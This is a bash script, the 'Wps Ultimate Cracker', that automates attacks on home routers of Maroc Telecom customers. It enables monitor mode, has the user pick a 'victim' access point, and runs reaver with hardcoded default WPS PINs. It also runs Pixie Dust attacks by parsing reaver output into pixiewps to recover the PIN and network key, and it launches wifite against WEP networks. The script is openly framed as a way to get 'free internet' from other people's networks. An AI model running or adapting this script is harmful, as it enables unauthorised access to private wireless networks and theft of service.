#!/bin/bash

#############################################################################
# Ultimate Cracker made By Anass					    #
# Big thanxs to Silent-Ghost_X						    #
# This script will help you for cracking mush router Maroc Telecom          #
# See hello for the free internet					    #
# If you have any problem contact me https://www.facebook.com/abdolking12   #
# My acount Google Plus : younextvictim@gmail.com                           #
#############################################################################
# Regular Colors
Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White

# Bold
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White
The_Last_Funtions() {

echo -e  "$BCyan Bye Bye ^_^"
sleep 2
echo -e "$BYellow#############################################################################"
echo -e "$BYellow#$BWhite-$BGreen Wps$BRed Ultimate$BCyan Cracker made By$Green Anass                                       $BYellow#"
echo -e "$BYellow#$BWhite-$BGreen Big thanxs to$Green Hackshow						    $BYellow#"
echo -e "$BYellow#$BWhite-$BGreen My acount Google Plus :$BPurple younextvictim@gmail.com                          $BYellow#"
echo -e "$BYellow#$BWhite-$BGreen My Account facebook:$BPurple https://www.facebook.com/abdolking12                $BYellow#"
echo -e "$BYellow#$BWhite-$BRed AllCopyright are Reserved $BWhiteÂ©                                              $BYellow#"
echo -e "$BYellow#############################################################################"
exit 
}
Ver_Mon_WCar_Fun() {
                 echo ""
airmon-ng | tee airmon-ng.txt > /dev/null


				 echo -e "$BWhite[+]$BGreen Scanning for wireless devices ..."
                 if [ "$VerCar" -ge "1" ] && [ "$VerMon" = "" ]
                      then
                           Num_Line=`iwconfig 2>&1 | grep '802.11' | wc -l `
						   echo -e "$BWhite[+] We found$Green $Num_Line$White wireless device(s)."
						   echo ""
						   
						   echo -e "       ${BCyan} Interface   $BCyan     Chipset        "
echo ""
						  
						   for (( c=1; c<=$Num_Line; c++))
       						    do
								  m[$c]=`iwconfig 2>&1 | grep '802.11' | awk '{print $1}' | sed -n ${c}'p'`
	     						  Print_Mod=`cat airmon-ng.txt | grep ${m[$c]} | cut -f1-3`
	     						  echo -e "    $Green[$c]$White $Print_Mod"
						   done
						   echo ""
						   echo ""
						   while [ "$V_number" != "1" ]
								 do
								   echo -en "\033[1A\033[2K"
						           echo -e -n "${White}[+] Choose $BRed number$White of wireless device to put into$Green monitor mode$White [${Green}1-$Num_Line$White]:$Green"
						           read number
						           wlan=${m[$number]}
								   if [ $number -ge 1 ] && [ $number -le $Num_Line ]; then
									    V_number=1
						   		   else
									    V_number=0
rm airmon-ng.txt
								   fi
						   done
						   echo -e "$White[+]The monitor is enabling on $Green $wlan $White..."
                           airmon-ng start $wlan  > /dev/null
                 elif [ "$VerCar" -le "0" ]
                        then   
						    echo "" 
                            sleep 0.5
                            echo -n -e "$BWhite[!]"
                            echo -e $BGreen" Wireless Card Not Found"
rm airmon-ng.txt

The_Last_Funtions
                            echo ""
                            sleep 0.5

exit
                 fi
				 airmon-ng > .airmon-ng.txt
                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                 VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
rm airmon-ng.txt
}
Ver_Mon_Fun() {
airmon-ng | tee airmon-ng.txt > /dev/null
                           cou_mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
						   if [ $cou_mon -eq 1 ]
						        then
								    mon=`iwconfig 2>&1 | grep Mode:Monitor | awk '{print $1}'`
									Num_Mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
						   elif [ $cou_mon -gt 1 ]
						        then
						            Num_Mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
								    echo -e "$BWhite[+] I found$Green $cou_mon$White monitor mode."
									echo ""
									
						            echo -e "       ${BRed} Interface     $Cyan     Chipset        "
echo ""						            
						            for (( c=1; c<=$Num_Mon; c++))
       						            do
										    m[$c]=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}' | sed -n ${c}'p'`
	     						            Print_Mod=`cat .airmon-ng.txt | grep ${m[$c]} | cut -f1-3`
	     						            echo -e "    $Green[$c]$White $Print_Mod"
						            done
rm airmon-ng.txt
									echo ""
									echo ""
									while [ "$V_number" != "1" ]
									        do
											  echo -en "\033[1A\033[2K"
						                      echo -e -n "\r${White}[+] Choose$Red number$White of interface to use in Airodump [${Green}1-$Num_Mon$White]:$Green"
						                      read number
						                      mon=${m[$number]}
											  if [ $number -ge 1 ] && [ $number -le $Num_Mon ]; then
											       V_number=1
											  else
											       V_number=0
											  fi
								    done
						   fi
						   rm -rf  airmon-ng.txt
}


re='Y'
while [ $re == 'Y' ] || [ $re == 'y' ] || [ $re == 'Yes' ] || [ $re == 'YES' ] || [ $re == 'yes' ] || [ $re == 'O' ] || [ $re == 'o' ] || [ $re == 'Oui' ] || [ $re == 'OUI' ] || [ $re == 'oui' ]
do
clear
clear
echo -e "$BYellow    +--------------------------------------------------------------------+"
sleep 0.1
echo -e "    $BYellow|    			$Red	__     __             $Cyan ______    $BYellow|"
sleep 0.1
echo -e "   $BYellow |  $Greenâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—	$Redâ–ˆâ–ˆ|   |â–ˆâ–ˆ|	     $Cyanâ•”â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘	 $BYellow|	"
sleep 0.1
echo -e "    $BYellow|  $Greenâ–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•       $Redâ–ˆâ–ˆ|   |â–ˆâ–ˆ| $BWhite _____   $Cyanâ–ˆâ–ˆ|          $BYellow|	"
sleep 0.1
echo -e "    $BYellow|  $BGreenâ–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—       $BRedâ–ˆâ–ˆ|   |â–ˆâ–ˆ| $BWhite|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ|  $BCyanâ–ˆâ–ˆ|          $BYellow| 		"
sleep 0.1
echo -e "    $BYellow|  $BGreenâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â• â•šâ•â•â•â•â–ˆâ–ˆâ•‘	$BRedâ–ˆâ–ˆ|___|â–ˆâ–ˆ|          $BCyanâ–ˆâ–ˆ|_______   $BYellow|"
sleep 0.1
echo -e "    $BYellow|  $Greenâ•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘	$Redâ•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•  	     $Cyanâ•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   $BYellow|		"
sleep 0.1
echo -e "    $BYellow|   $Greenâ•šâ•â•â•â•šâ•â•â• â•šâ•â•     â•šâ•â•â•â•â•â•â•	 $Redâ•šâ•â•â•â•â•â•â•             $Cyanâ•šâ•â•â•â•â•â•â•   $BYellow|"
sleep 0.1
echo -e "$BYellow    +-----------------------+----------------------+---------------------+"
sleep 0.1
echo -e "                            |$BGreen Wps$BRed Ultimate$BCyan Cracker $BYellow|"
echo -e "$BYellow                            +----------------------+"












echo ""
echo ""
echo -n ""
echo -e "$Red [${BPurple} 1$Red ] $BCyan Attack automatically Sagem fast 1704 (SAGEM_XXXX)"
sleep 0.1
echo -e "$Red [${BPurple} 2$Red ] $BCyan Attack automatically Technicolor td5130 v1 / v2 (TNCAPXXXXX)"
sleep 0.1
echo -e "$Red [${BPurple} 3$Red ] $BCyan Attack automatically Dlink (Dlink_xxxxx)"
sleep 0.1
echo -e "$Red [${BPurple} 4$Red ] $BCyan Attack automatically Huwauei 532e (hg532_xxxxx)"
sleep 0.1
echo -e "$Red [${BPurple} 5$Red ] $BCyan Attack automatically for WEP (mush AP Encrypted with WEP)"
sleep 0.1
echo -e "$Red [${BPurple} 6$Red ] $BCyan Exit"
sleep 0.1
echo -e -n  "	$Red[$Yellow +$Red ]$BGreen Select $BPurple onething $BGreen from  menu $BBlue every thing for $BRed free ^_^ : "
sleep 0.1

read menu
case $menu in 
"1")
                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                 VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
                 Ver_Mon_WCar_Fun
                 if [ "$VerMon" != "" ]
                      then
                           Ver_Mon_Fun
                           
						  echo -e "$BWhite[+]$BYellow When you see your victim press Ctrl+C"
						   sleep 3 
						   airodump-ng $mon
                 fi

                           echo -n -e "${White}  [+]$BCyan MAC : $White"
                           read  MAC
                           sleep 0.5
                           echo " "
                           echo -n -e "${White}  [+]$BCyan CH : $White"
                           read  CH
                           echo -e "$Red"
echo -e "$BWhite[+]$BGreenWait until the reaver get$BRed The key "
echo -e "$BGreen"
reaver -i mon0 -b $MAC -c $CH -p 43944552 -vvv -g 1

echo -e "$Red[${BPurple} 1$Red ] $BCyan Yes"
echo -e "$Red[${BPurple} 2$Red ] $BCyan No"
echo -e -n " $BWhite[?]$BCyan Do you get The key :"
read key
case $key in
"1")
echo -e "$BGreen Congratilation [^_^]"
airmon-ng stop $mon  > /dev/null
The_Last_Funtions
;;
"2")

echo -e "$BWhite[+] $BGreen Wait until reaver try the other pin "

echo -e "$BGreen"
reaver -i mon0 -b $MAC -c $CH -p 13419622 -vvv -g 1
airmon-ng stop $mon  > /dev/null
The_Last_Funtions
;;
esac

 


The_Last_Funtions
;;
"2")
reaver 2&> Ver_Reaver.txt
                 pixiewps 2&> Ver_Pixiewps.txt
				 Ver_libpcap_dev=`dpkg -l | grep libpcap0.8-dev`
				 Ver_libsqlite3_dev=`dpkg -l | grep libsqlite3-dev`
				 Ver_Reaver=`cat Ver_Reaver.txt | grep 'Reaver v1.5.2'`
                 Ver_Pixiewps=`cat Ver_Pixiewps.txt | grep 'Pixiewps 1.1'`
                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                 VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
				 Uname=`uname -m`
				 rm -rf  Ver_Reaver.txt Ver_Pixiewps.txt
				 echo ""
				 if [ "$Ver_libpcap_dev" = "" ]
				      then
					       echo ""
					       echo -e "$BWhite[!]$BRed I D'ont found Libpcap-dev put i will install it  ..."
						   sleep 3
						   if [ $Uname == 'i686' ]
		                   	    then
						            cd outil/32bits
						            dpkg -i libpcap0.8-dev_1.3.0-1_i386.deb
                                    dpkg -i libpcap-dev_1.3.0-1_all.deb
						            cd ../..
						        else
						        	cd outil/64bits
						            dpkg -i libpcap0.8-dev_1.3.0-1_amd64.deb
                                    dpkg -i libpcap-dev_1.3.0-1_all.deb
						            cd ../..
							fi
			     fi
				 if [ "$Ver_libsqlite3_dev" = "" ]
				      then
					       echo ""
					       echo -e "$BWhite [!]$BRed I D'ont found Libsqlite3-dev put i will install it ..."
						   if [ $Uname == 'i686' ]
		                   	    then
								    cd outil/32bits
						            dpkg -i libsqlite3-dev_3.7.16.2-1~bpo70+1_i386.deb
						            cd ../..
								else
								    cd outil/64bits
									dpkg -i libsqlite3-dev_3.7.16.2-1~bpo70+1_amd64.deb
									cd ../..
				 fi
				 fi
				 if [ "$Ver_Pixiewps" = "" ]
				      then
					       echo ""
						   echo -e "$BWhite [!]$BRed I D'ont found Pixiewps put i will install it ..."
						   sleep 2
						   cd outil
					       unzip pixiewps-master.zip
						   cd pixiewps-master/src
						   make
						   make install
						   cd ../..
						   rm -rf pixiewps-master
						   cd ..
				fi
				if [ "$Ver_Reaver" = "" ]
				      then
					       echo ""
						   echo -e "$BWhite [!]$BRed I D'ont found Reaver 1.5.2 put i will install it"
						   sleep 2
						   cd outil
					       unzip reaver-wps-fork-t6x-master.zip
						   cd reaver-wps-fork-t6x-master/src
						   chmod +x configure
						   ./configure
						   make
						   make install
						   cd ../..
						   rm -rf reaver-wps-fork-t6x-master
						   cd ..
				fi
				Ver_Mon_WCar_Fun
                 if [ "$VerMon" != "" ]
                      then
                           Ver_Mon_Fun
                           echo -e "$BRed"
						  echo -e "$BWhite[+]$BYellow When you see your victim press Ctrl+C"
						   sleep 3 
						   airodump-ng $mon
fi

echo -n -e "${White}  [+]$BCyan MAC : $White"
                           read  MAC
                           sleep 0.5
                           echo " "
                           echo -n -e "${White}  [+]$BCyan CH : $White"
                           read  CH
echo -e "$BWhite[+]Wait until Reaver collect all information about$BGreen [AP]"
echo -e "$BGreen"
reaver -i mon0 -b $MAC -c $CH -vvv  -g 1 | tee Reaver.txt
   Manufacturer=`cat Reaver.txt | grep Manufacturer: | cut -d' ' -f2- | sed  -n 1p`
						   Model_Name=`cat Reaver.txt | grep Name: | cut -d' ' -f2- | sed -n 1p`
						   Model_Number=`cat Reaver.txt | grep 'Model Number:' | cut -d' ' -f2- | sed -n 1p`
						   Serial_Number=`cat Reaver.txt | grep 'Serial Number:' | cut -d' ' -f2- | sed -n 1p`
                           e=`cat Reaver.txt | grep PKE: | cut -d' ' -f3 | sed -n 1p`
                           r=`cat Reaver.txt | grep PKR: | cut -d' ' -f3 | sed -n 1p`
                           s=`cat Reaver.txt | grep E-Hash1: | cut -d' ' -f3 | sed -n 1p`
                           z=`cat Reaver.txt | grep E-Hash2: | cut -d' ' -f3 | sed -n 1p`
                           a=`cat Reaver.txt | grep AuthKey: | cut -d' ' -f3 | sed -n 1p`
                           n=`cat Reaver.txt | grep E-Nonce: | cut -d' ' -f3 | sed -n 1p`
                           m=`cat Reaver.txt | grep R-Nonce: | cut -d' ' -f3 | sed -n 1p`
                           WPS=`cat Reaver.txt | grep 'WPS PIN'`
echo -e  "$BRed+--------------------------------------------+"
echo -e  "$BRed|$BWhite[!]$BYellow You can see all arguments here	     $BRed|"
echo -e  "$BRed+--------------------------------------------+"
 echo ""
echo -e  "$BRed+--------------------------------------------+"
echo -e "$BRed|$BWhite[!]$BCyan First some informations about the victim$BRed|"
echo -e  "$BRed+--------------------------------------------+"
									 sleep 0.2
						   		     echo -e "$BYellow [+]Manufacturer= $BCyan $Manufacturer"
						   		     echo ""
						   		     sleep 0.2
						   		     echo -e "$BYellow [+]Model_Name= $BCyan $Model_Name"
		     						 echo ""
						   		     sleep 0.2
				                 	             echo -e "$BYellow [+]Model_Number= $BCyan $Model_Number"
						   		     echo ""
						   		     sleep 0.2
								     echo -e "$BYellow [+]Serial_Number= $BCyan $Serial_Number"
echo -e "$BCyan"
echo -e  "$BRed+--------------------------------------------+"
echo -e  "$BRed|$BWhite[!]$BCyan Now the uses argument in Pixie Dust$BRed|" 
echo -e  "$BRed+--------------------------------------------+"
sleep 0.1 
						   		     echo ""
						   		     sleep 0.2
									if [ "$e" != "" ]
									       then
									echo -e "$BWhite [+]$BYellow PKE=$BCyan $e"
 									sleep 0.1
else
									echo -e "$BWhite [+]$BYellow PKE =$BCyan Not Found"
fi
echo ""
									if [ "$r" != "" ]
									then
									echo  -e "$BWhite [+]$BYellow PKR= $BCyan $r"
 									sleep 0.1
else
									echo -e " $BWhite [+]$BYellow PKR =$BCyan Not Found" 
fi
									if [ "$s" != "" ]
									       then
									echo -e "$BWhite  [+]$BYellow E-Hash1=$BCyan $s"
 									sleep 0.1
else
									echo -e "$BWhite  [+]$BYellow E-Hash1 =$BCyan Not Found"
fi
echo ""
									if [ "$z" != "" ]
									then
									echo -e "$BWhite  [+]$BYellow E-Hash2= $BCyan $z"
 									sleep 0.1
else
									echo -e "$BWhite  [+]$BYellow E-Hash2 =$BCyan Not Found" 
fi
									if [ "$a" != "" ]
									       then
									echo -e "$BWhite  [+]$BYellow Authkey=$BCyan $a"
 									sleep 0.1
else
									echo -e "$BWhite  [+]$BYellow Authkey =$BCyan Not Found"
fi
echo ""
									if [ "$n" != "" ]
									then
									echo  -e "$BWhite  [+]$BYellow E-Nonce= $BCyan $n"
 									sleep 0.1
else
									echo -e " $BWhite  [+]$BYellow E-Nonce =$BCyan Not Found" 
fi
					if [ "$m" != "" ]
									then
									echo  -e "$BWhite  [+]$BYellow R-Nonce= $BCyan $m"
 									sleep 0.1
else
									echo -e " $BWhite  [+]$BYellow R-Nonce =$BCyan Not Found" 
fi
									echo -e "$BWhite   [+]$BGreen BSSID =$BWhite $MAC"
									echo -e "$BWhite   [+]$BGreen Chanel=$BWhite $CH"
echo -e " [!] Whait some time please because pixiewps has been running correctly with the informtaion"
echo -e -n "That's Maybe take 30 min max"
echo -e "$BWhite"
pixiewps -v 3 -f -e $e -r $r -s $s -z $z -a $a -n $n -m $m -b $MAC | tee PIN.txt
echo -e "$BGreen"

									              PIN=`less PIN.txt | grep 'WPS pin:' | cut -d" " -f8`
									              if [ "$PIN" != "" ]
									                   then
										                    echo ""
										                    echo -e "$White [+] The Pin is $PIN $Green Wait $White You will $Green get $White The Key "
											                echo ""
										                    reaver -i $mon -b $MAC -c $CH -n -p $PIN 
											                echo -e "$Yellow [+]$Green Congratulation the pin is $PIN (^_^) "
													        echo ""
									              else
									                   echo ""
										               echo -e "$Red[!]$White $BGreen Sorry pin not found,good luck next try."
fi
rm Reaver.txt
airmon-ng stop mon0 > /dev/null 
The_Last_Funtions
;;
"3")
reaver 2&> Ver_Reaver.txt
                 pixiewps 2&> Ver_Pixiewps.txt
				 Ver_libpcap_dev=`dpkg -l | grep libpcap0.8-dev`
				 Ver_libsqlite3_dev=`dpkg -l | grep libsqlite3-dev`
				 Ver_Reaver=`cat Ver_Reaver.txt | grep 'Reaver v1.5.2'`
                 Ver_Pixiewps=`cat Ver_Pixiewps.txt | grep 'Pixiewps 1.1'`
                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                 VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
				 Uname=`uname -m`
				 rm -rf  Ver_Reaver.txt Ver_Pixiewps.txt
				 echo ""
				 if [ "$Ver_libpcap_dev" = "" ]
				      then
					       echo ""
					       echo -e "$BWhite [!]$BRed I D'ont found Libpcap-dev put i will install it  ..."
						   sleep 3
						   if [ $Uname == 'i686' ]
		                   	    then
						            cd outil/32bits
						            dpkg -i libpcap0.8-dev_1.3.0-1_i386.deb
                                    dpkg -i libpcap-dev_1.3.0-1_all.deb
						            cd ../..
						        else
						        	cd outil/64bits
						            dpkg -i libpcap0.8-dev_1.3.0-1_amd64.deb
                                    dpkg -i libpcap-dev_1.3.0-1_all.deb
						            cd ../..
							fi
			     fi
				 if [ "$Ver_libsqlite3_dev" = "" ]
				      then
					       echo ""
					       echo -e "$BWhite [!]$BRed I D'ont found Libsqlite3-dev put i will install it ..."
						   if [ $Uname == 'i686' ]
		                   	    then
								    cd outil/32bits
						            dpkg -i libsqlite3-dev_3.7.16.2-1~bpo70+1_i386.deb
						            cd ../..
								else
								    cd outil/64bits
									dpkg -i libsqlite3-dev_3.7.16.2-1~bpo70+1_amd64.deb
									cd ../..
				 fi
				 fi
				 if [ "$Ver_Pixiewps" = "" ]
				      then
					       echo ""
						   echo -e "$BWhite [!]$BRed I D'ont found Pixiewps put i will install it ..."
						   sleep 2
						   cd outil
					       unzip pixiewps-master.zip
						   cd pixiewps-master/src
						   make
						   make install
						   cd ../..
						   rm -rf pixiewps-master
						   cd ..
				fi
				if [ "$Ver_Reaver" = "" ]
				      then
					       echo ""
						   echo -e "$BWhite [!]$BRed I D'ont found Reaver 1.5.2 put i will install it"
						   sleep 2
						   cd outil
					       unzip reaver-wps-fork-t6x-master.zip
						   cd reaver-wps-fork-t6x-master/src
						   chmod +x configure
						   ./configure
						   make
						   make install
						   cd ../..
						   rm -rf reaver-wps-fork-t6x-master
						   cd ..
				fi
				Ver_Mon_WCar_Fun
                if [ "$VerMon" != "" ]
                      then
                           Ver_Mon_Fun
                           echo -e "$BRed"
						  echo -e "$BWhite[+]$BYellow When you see your victim press Ctrl+C"
						   sleep 3 
						   airodump-ng $mon
fi
echo -n -e "${White}  [+]$BCyane MAC : $White"
                           read  MAC
                           sleep 0.5
                           echo " "
                           echo -n -e "${White}  [+]$BCyan CH : $White"
                           read  CH
                           echo -e "$Red"
echo -e "[${BPurple} 1$Red ] pins default"
echo -e "[${BPurple} 2$Red ] pixiewps"
	
	echo -e -n "[+]$BGreen What do you $BRed Want to $BYellow try it : $BPurple"
read try 
case $try in
"1")

	echo -e " $BBlue [+]Wait until $BYellow reaver try the $BRed pin "
reaver -i mon0 -b $MAC -c $CH  -p 20172527 -vvv
echo -e "$BGreen"
read -p "[!]If you Get the key | congratilations if no press enter for trying other pin "

	echo -e " $BBlue [+]Wait until $BYellow reaver try the other  $BRed pin "

reaver -i mon0 -b $MAC -c $CH  -p 17084215 -vvv
echo -e "$BGreen"
read -p "[!]If you Get the key | congratilations if no press enter for trying other pin "

echo -e " $BBlue [+]Wait until $BYellow reaver try the other  $BRed pin "

reaver -i mon0 -b $MAC -c $CH  -p 12345670 -vvv
echo -e "$BGreen"
read -p "[!]If you Get the key | congratilations if you need to try with Pixiewps "
;;
"2")

reaver -i mon0 -b $MAC -c $CH -K 1
The_Last_Funtions
;;
esac
airmon-ng stop mon0 > /dev/null
The_Last_Funtions
;;
"4")
reaver 2&> Ver_Reaver.txt
                 pixiewps 2&> Ver_Pixiewps.txt
				 Ver_libpcap_dev=`dpkg -l | grep libpcap0.8-dev`
				 Ver_libsqlite3_dev=`dpkg -l | grep libsqlite3-dev`
				 Ver_Reaver=`cat Ver_Reaver.txt | grep 'Reaver v1.5.2'`
                 Ver_Pixiewps=`cat Ver_Pixiewps.txt | grep 'Pixiewps 1.1'`
                 VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                 VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
				 Uname=`uname -m`
				 rm -rf  Ver_Reaver.txt Ver_Pixiewps.txt
				 echo ""
				 if [ "$Ver_libpcap_dev" = "" ]
				      then
					       echo ""
					       echo -e "$BWhite [!]$BRed I D'ont found Libpcap-dev put i will install it  ..."
						   sleep 3
						   if [ $Uname == 'i686' ]
		                   	    then
						            cd outil/32bits
						            dpkg -i libpcap0.8-dev_1.3.0-1_i386.deb
                                    dpkg -i libpcap-dev_1.3.0-1_all.deb
						            cd ../..
						        else
						        	cd outil/64bits
						            dpkg -i libpcap0.8-dev_1.3.0-1_amd64.deb
                                    dpkg -i libpcap-dev_1.3.0-1_all.deb
						            cd ../..
							fi
			     fi
				 if [ "$Ver_libsqlite3_dev" = "" ]
				      then
					       echo ""
					       echo -e "$BWhite [!]$BRed I D'ont found Libsqlite3-dev put i will install it ..."
						   if [ $Uname == 'i686' ]
		                   	    then
								    cd outil/32bits
						            dpkg -i libsqlite3-dev_3.7.16.2-1~bpo70+1_i386.deb
						            cd ../..
								else
								    cd outil/64bits
									dpkg -i libsqlite3-dev_3.7.16.2-1~bpo70+1_amd64.deb
									cd ../..
				 fi
				 fi
				 if [ "$Ver_Pixiewps" = "" ]
				      then
					       echo ""
						   echo -e "$BWhite [!]$BRed I D'ont found Pixiewps put i will install it ..."
						   sleep 2
						   cd outil
					       unzip pixiewps-master.zip
						   cd pixiewps-master/src
						   make
						   make install
						   cd ../..
						   rm -rf pixiewps-master
						   cd ..
				fi
				if [ "$Ver_Reaver" = "" ]
				      then
					       echo ""
						   echo -e "$BWhite [!]$BRed I D'ont found Reaver 1.5.2 put i will install it"
						   sleep 2
						   cd outil
					       unzip reaver-wps-fork-t6x-master.zip
						   cd reaver-wps-fork-t6x-master/src
						   chmod +x configure
						   ./configure
						   make
						   make install
						   cd ../..
						   rm -rf reaver-wps-fork-t6x-master
						   cd ..
				fi
				 Ver_Mon_WCar_Fun
                 if [ "$VerMon" != "" ]
                      then
                           Ver_Mon_Fun
                           echo -e "$BRed"
						  echo -e "$BWhite[+]$BYellow When you see your victim press Ctrl+C"
						   sleep 3 
						   airodump-ng $mon
fi
echo -n -e "${White}  [+]$BCyan MAC : $White"
                           read  MAC
                           sleep 0.5
                           echo " "
                           echo -n -e "${White}  [+]$BCyan CH : $White"
                           read  CH
                           echo -e "$Red"
echo -e "$BGreen"
reaver -i $mon -b $MAC -c $CH -vvv -S -g 1 | tee Reaver.txt
   Manufacturer=`cat Reaver.txt | grep Manufacturer: | cut -d' ' -f2- | sed  -n 1p`
						   Model_Name=`cat Reaver.txt | grep Name: | cut -d' ' -f2- | sed -n 1p`
						   Model_Number=`cat Reaver.txt | grep 'Model Number:' | cut -d' ' -f2- | sed -n 1p`
						   Serial_Number=`cat Reaver.txt | grep 'Serial Number:' | cut -d' ' -f2- | sed -n 1p`
                           e=`cat Reaver.txt | grep PKE: | cut -d' ' -f3 | sed -n 1p`
                           r=`cat Reaver.txt | grep PKR: | cut -d' ' -f3 | sed -n 1p`
                           s=`cat Reaver.txt | grep E-Hash1: | cut -d' ' -f3 | sed -n 1p`
                           z=`cat Reaver.txt | grep E-Hash2: | cut -d' ' -f3 | sed -n 1p`
                           a=`cat Reaver.txt | grep AuthKey: | cut -d' ' -f3 | sed -n 1p`
                           n=`cat Reaver.txt | grep E-Nonce: | cut -d' ' -f3 | sed -n 1p`
                           m=`cat Reaver.txt | grep R-Nonce: | cut -d' ' -f3 | sed -n 1p`
                           WPS=`cat Reaver.txt | grep 'WPS PIN'`
echo -e  "$BRed+--------------------------------------------+"
echo -e  "$BRed|$BYellow[!]$BYellow You can see all arguments here	     $BRed|"
echo -e  "$BRed+--------------------------------------------+"
 echo ""
echo -e  "$BRed+--------------------------------------------+"
echo -e "$BRed|$BCyan[!]$BCyanFirst some informations about the victim     $BRed |"
echo -e  "$BRed+--------------------------------------------+"
									 sleep 0.2
						   		     echo -e "$BYellow [+]Manufacturer= $BCyan $Manufacturer"
						   		     echo ""
						   		     sleep 0.2
						   		     echo -e "$BYellow [+]Model_Name= $BCyan $Model_Name"
		     						 echo ""
						   		     sleep 0.2
				                 	             echo -e "$BYellow [+]Model_Number= $BCyan $Model_Number"
						   		     echo ""
						   		     sleep 0.2
								     echo -e "$BYellow [+]Serial_Number= $BCyan $Serial_Number"
echo -e "$BCyan"
echo -e  "$BRed+--------------------------------------------+"
echo -e  "$BRed| [!]Now the uses argument in Pixie Dust     $BRed|" 
echo -e  "$BRed+--------------------------------------------+"
sleep 0.1 
						   		     echo ""
						   		     sleep 0.2
									if [ "$e" != "" ]
									       then
									echo -e "$BYellow [+] PKE=$BCyan $e"
 									sleep 0.1
else
									echo -e "$BYellow [+] PKE =$BCyan Not Found"
fi
echo ""

									if [ "$s" != "" ]
									       then
									echo -e "$BYellow  [+] E-Hash1=$BCyan $s"
 									sleep 0.1
else
									echo -e "$BYellow  [+] E-Hash1 =$BCyan Not Found"
fi
echo ""
									if [ "$z" != "" ]
									then
									echo -e "$BYellow  [+] E-Hash2= $BCyan $z"
 									sleep 0.1
else
									echo -e "$BYellow  [+] E-Hash2 =$BCyan Not Found" 
fi
									if [ "$a" != "" ]
									       then
									echo -e "$BYellow  [+] Authkey=$BCyan $a"
 									sleep 0.1
else
									echo -e "$BYellow  [+] Authkey =$BCyan Not Found"
fi
									echo -e "$BWhite   [+]$BGreen BSSID =$BWhite $MAC"
									echo -e "$BWhite   [+]$BGreen Chanel=$BWhite $CH"
echo ""
pixiewps -e $e -s $s -z $z -a $a -S  | tee PIN.txt
echo -e "$BGreen"

									              PIN=`less PIN.txt | grep 'WPS pin:' | cut -d" " -f8`
									              if [ "$PIN" != "" ]
									                   then
										                    echo ""
										                    echo -e "$White [+] The Pin is $PIN $Green Wait $White You will $Green get $White The Key "
											                echo ""
										                    reaver -i $mon -b $MAC -c $CH -n -p $PIN -vvv
											                echo -e "$Yellow [+]$Green Congratulation the pin is $PIN (^_^) "
													        echo ""
									              else
									                   echo ""
										               echo -e "$Red[!]$White $BGreen Sorry pin not found,good luck next try."

fi
The_Last_Funtions
rm Reaver.txt
rm PIN.txt
airmon-ng stop $mon  > /dev/null
;;
"5")

         chmod +x wifite.py
         ./wifite.py

VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                 VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
                 Ver_Mon_WCar_Fun
                 if [ "$VerMon" != "" ]
                      then
                           Ver_Mon_Fun
fi
chmod +x wifite.py
         ./wifite.py
The_Last_Funtions

;;
"6")
The_Last_Funtions
;;


*)
echo "" 
echo -e " $Yellow[!] $BGreen Incorrect choise " 
;;
esac 
echo ""
echo -n -e "$Red              [!]$BBlue Do you want$BRed go to the first $BBlue menu $BCyan Y $BYellow or $BCyan N:$BGreen "
read re
if [ $re = N ]
then
The_Last_Funtions
fi
if [ $re = n ]
then
The_Last_Funtions
fi
if [ $re = No ]
then
The_Last_Funtions
fi
if  [ $re = NO ]  
then
The_Last_Funtions
fi

if  [ $re = no ]
then
The_Last_Funtions
fi
echo ""
